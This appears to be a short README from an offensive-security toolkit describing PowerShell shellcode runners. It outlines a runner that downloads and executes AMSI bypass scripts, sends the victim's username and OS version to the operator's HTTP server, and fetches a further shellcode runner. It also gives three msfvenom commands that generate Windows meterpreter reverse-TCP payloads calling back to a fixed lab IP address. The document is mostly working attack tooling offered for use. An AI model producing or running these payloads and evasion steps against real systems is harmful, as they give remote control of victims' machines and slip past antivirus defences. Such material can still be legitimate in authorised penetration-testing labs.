# Shell Code Runners

## Runner (Powershell) Code Runner
runner.ps1
```bash
# Requirements: Update the $IP with kali tun0 IP address
# Step 1 - Contains amsi bypass 1.txt and 2.txt which will download and run
# Step 2 - Pass two variables in two requests and can be viewable from pythons http.server output; username and OS version
# Step 3 - Download and run the referenced shellcode runner, usually sliver.ps1 (or .txt depending on AV context) as referenced in sliver.ps1
```

## Powershell Code Runners
powershellCodeRunner-32.ps1

```bash
# meterpreter payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.165 LPORT=8080 EXITFUNC=thread -f ps1
```

## Powershell Code Runners
powershellCodeRunner-64.ps1

```bash
# meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.165 LPORT=8080 EXITFUNC=thread -f ps1
```

## Sliver (Powershell) Code Runner to point to stage-listner for x64 host
sliver.ps1

```bash
# meterpreter payload 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.165 LPORT=8064 EXITFUNC=thread -f ps1
```